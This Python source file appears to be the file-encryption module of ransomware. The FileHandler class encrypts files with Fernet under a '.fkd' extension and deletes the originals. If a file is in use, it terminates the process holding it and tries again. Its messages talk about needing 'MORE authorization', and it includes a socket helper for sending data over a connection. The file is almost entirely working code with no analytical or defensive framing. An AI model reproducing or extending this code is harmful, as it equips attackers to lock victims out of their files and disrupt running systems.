import os
import time
import psutil
from cryptography.fernet import Fernet


class FileHandler:
    """
    A class for handling file operations, including encryption, decryption, and process termination.
    """

    def __init__(self):
        # It is not needed to create variables
        pass

    @staticmethod
    def decrypt_file(path, password):
        """
        Decrypts a file with the provided password.

        Args:
            path (str): The path to the encrypted file.
            password (str): The decryption password.

        Returns:
            bool: True if decryption was successful, False otherwise.
        """
        if not path.endswith('.fkd'):
            return False

        try:
            # Load the file's content into memory
            with open(path, 'rb') as file:
                file_content = file.read()

            # Generate a key from the password
            key = password
            f = Fernet(key)

            # Decrypt the file's content
            decrypted_content = f.decrypt(file_content)

            # Get the original file name (without the .fkd extension)
            original_path = os.path.splitext(path)[0]

            # Write the decrypted content back to the original file
            with open(original_path, 'wb') as file:
                file.write(decrypted_content)

            # Remove the encrypted file
            os.remove(path)

            print(f'File "{path}" decrypted successfully.')
            return True

        except Exception as e:
            print(f"Couldn't decrypt file: {path} - {e}")
            return False

    @staticmethod
    def terminate_process_using_file(path):
        """
        Terminate a process that is using a specific file.

        Args:
            path (str): The path to the file.

        Returns:
            bool: True if a process was terminated, False otherwise.
        """
        try:
            process_list = psutil.process_iter(['pid', 'name', 'open_files'])

            for process in process_list:
                try:
                    files = process.open_files()
                    for file in files:
                        if file.path == path:
                            print(f'Terminating process: {process.pid} - {process.name()}')
                            process.terminate()
                            return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue

            print('No process using the file was found.')
            return False

        except psutil.Error as e:
            print(f'Error: {e}')
            return False

    @staticmethod
    def try_encrypt_file(path, password):
        """
        Try to encrypt a file with the provided password.

        Args:
            path (str): The path to the file.
            password (str): The encryption password.

        Returns:
            bool: True if encryption was successful, False otherwise.
        """
        try:
            if not os.path.exists(path):
                print(f"Tried to encrypt, but file: {path} - does not exist.")
                return
            with open(path, 'rb') as file:
                file_content = file.read()

            key = password
            fernet = Fernet(key)
            encrypted_content = fernet.encrypt(file_content)
            print(f"File: {path} Content encrypted")

            new_path = path + '.fkd'

            if os.path.exists(new_path):
                print(f"Found existing .fkd file at: {new_path}")
                os.remove(new_path)
                print(f"Deleted .fkd file at: {new_path}")

            with open(new_path, 'wb') as file:
                file.write(encrypted_content)
            print(f"Wrote encrypted data to {new_path} successfully")

            os.remove(path)

            print(f"File {path} deleted successfully")

            print(f'File "{path}" encrypted successfully to {new_path}.')
            return True

        except Exception as e:
            print(f"Couldn't encrypt file: {path} - {e}")
            return False

    def encrypt_file(self, path, password):
        """
        Encrypt a file with the provided password.

        Args:
            path (str): The path to the file.
            password (str): The encryption password.

        Returns:
            bool: True if encryption was successful, False otherwise.
        """
        if path.endswith('.fkd'):
            print(f"Skipping file as it is already encrypted: {path}")
            return

        if self.try_encrypt_file(path, password):
            return
        else:
            print("Something went wrong.. Going to try a different way. "
                  "Now searching for any process using the file.. wait..")

            if self.terminate_process_using_file(path):
                print("Found process. Terminated it. Encrypting...")

                if self.try_encrypt_file(path, password):
                    return
                else:
                    print(f"Sadly file: {path} could not be encrypted. Maybe we need MORE authorization.")

            else:
                print('Something went wrong.. the last time....')

                if self.try_encrypt_file(path, password):
                    return
                else:
                    print(f"Sadly file: {path} could not be encrypted. Maybe we need MORE authorization.")

    @staticmethod
    def send_data_with_timeout(conn, data, timeout=0.1):
        """
        Send data over a connection with a specified timeout.

        Args:
            conn: The connection object for sending data.
            data (bytes): The data to send.
            timeout (float): The maximum time to spend sending data.

        Returns:
            None
        """
        start_time = time.time()
        sent = 0

        while sent < len(data):
            try:
                sent_bytes = conn.send(data[sent:])
                if sent_bytes == 0:
                    # Handle the case where the connection is closed prematurely
                    raise ConnectionError("Socket connection was closed")
                sent += sent_bytes
            except Exception as e:
                # Handle any exceptions that may occur during sending
                print(f"Error sending data: {e}")
                break

            # Check if the timeout has been exceeded
            if time.time() - start_time > timeout:
                print("Timeout exceeded while sending data")
                break
